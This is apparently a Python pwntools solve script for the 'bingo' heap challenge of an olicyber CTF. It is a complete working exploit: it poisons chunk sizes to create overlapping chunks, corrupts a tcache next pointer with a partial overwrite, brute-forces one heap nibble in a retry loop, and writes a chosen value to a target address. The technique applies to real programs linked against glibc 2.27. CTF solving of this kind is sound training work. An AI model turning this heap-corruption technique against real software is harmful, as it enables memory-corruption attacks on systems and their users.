#!/usr/bin/env python3

from pwn import *

elf = ELF("./bingo_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        if args.TEST:
            r = remote('localhost', 1907)
        else:
            r = remote('bin-go.challs.olicyber.it', 18000)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b *challenge+51
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def alloc(io, size: int, data: bytes, new_line: bool = True):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(size).encode())
    if new_line:
        io.sendlineafter(b'> ', data)
    else:
        io.sendafter(b'> ', data)
    
def free(io):
    io.sendlineafter(b'> ', b'2')
    
def check(io):
    io.sendlineafter(b'> ', b'3')


def main():
    r = conn()
    
    # poison size of next 0x30 chunk
    alloc(r, 0x18, b'A'*0x18 + p64(0x61), new_line=False)
    free(r)
    
    alloc(r, 0x28, b'B'*0x28 + p64(0x81), new_line=False) # poison size of next 0x40 chunk
    alloc(r, 0x28, b'C'*0x27) # poisoned chunk, when freed will overlap with next 0x30 chunk
    free(r)
    free(r)
    
    # put the 0x80 poisoned chunk into tcache bins
    alloc(r, 0x38, b'')
    alloc(r, 0x38, b'')
    free(r)
    free(r)
    
    # poison the next 0x40 chunk size
    alloc(r, 0x78, b'A'*0x38 + p64(0x31), new_line=False)
    free(r)
    
    # put the 0x30 poisoned chunk into tcache bins
    alloc(r, 0x28, b'')
    alloc(r, 0x38, b'')
    free(r)
    free(r)
    
    # overwrite chunk next ptr to target address
    alloc(r, 0x58, b'A'*0x28 + p64(0x31) + b'\xe0\x0a', new_line=False)
    free(r)
    
    # put target address into tcache bins
    alloc(r, 0x28, b'')
    
    # allocate chunk at target address
    log.info("Overwriting target address with 0xdeadbeefdeadbeef")
    try:
        alloc(r, 0x28, p64(0xdeadbeefdeadbeef)*4, new_line=False)
    except EOFError:
        r.close()
        raise
    
    log.info("Calling check")
    check(r)
    
    print(r.recvall(timeout=1).decode())
    r.close()

if __name__ == "__main__":
    print('running the exploit a few times to make it work, we are bruteforcing one nibble in the heap')
    while True:
        try:
            main()
            break
        except Exception as e:
            print(f"Brute force went wrong, retrying... {e}")